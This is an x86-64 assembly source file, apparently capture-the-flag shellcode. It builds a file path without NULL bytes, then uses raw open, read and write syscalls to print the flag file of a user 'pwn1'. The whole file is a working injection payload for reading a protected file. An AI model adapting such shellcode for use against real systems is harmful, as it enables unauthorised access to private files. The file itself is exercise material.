BITS 64
global _start

section .text

_start:
    jmp _push_filename

_readfile:
    ; syscall open file
    pop rdi ; pop path value
    ; NULL byte fix
    dec byte [rdi + 15]
    inc byte [rdi + 14]

    xor rax, rax
    add al, 2
    xor rsi, rsi ; set O_RDONLY flag
    syscall

    ; syscall read file
    here:
    mov rdi, rax
    sub sp, 0x29
    lea rsi, [rsp]
    xor rdx, rdx
    add dx, 0x29; size to read
    sub al, al
    syscall

    ; syscall write to stdout
    xor rdi, rdi
    add dil, 1 ; set stdout fd = 1
    mov rdx, rax
    sub al, al
    add al, 1
    syscall
    jmp here


_push_filename:
    call _readfile
    path: db "/home/pwn1/flaf", 1

